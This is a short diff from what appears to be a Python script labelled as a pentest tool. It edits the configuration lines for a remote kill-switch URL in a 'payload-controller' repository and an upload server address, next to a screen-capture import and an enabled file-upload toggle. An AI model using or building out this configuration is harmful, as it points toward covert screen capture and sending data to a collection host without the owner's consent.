@@ -11,8 +11,8 @@ from PIL import ImageGrab  # For screen capture
 
 # === CONFIGURATION ===
 LOG_DIR = "pentest_logs"
-KILL_SWITCH_URL = "https://raw.githubusercontent.com/minizyperx/payload-controller/main/kill.txt"  # ✅ YOUR KILL SWITCH
-UPLOAD_URL = "http://192.168.112.1:8000"  # ✅ FIXED URL
+KILL_SWITCH_URL = "https://raw.githubusercontent.com/minizyperx/payload-controller/main/kill.txt"
+UPLOAD_URL = "http://192.168.112.1:8000"  
 ENABLE_UPLOAD = True  # Toggle file uploads
 
 # === SETUP ===
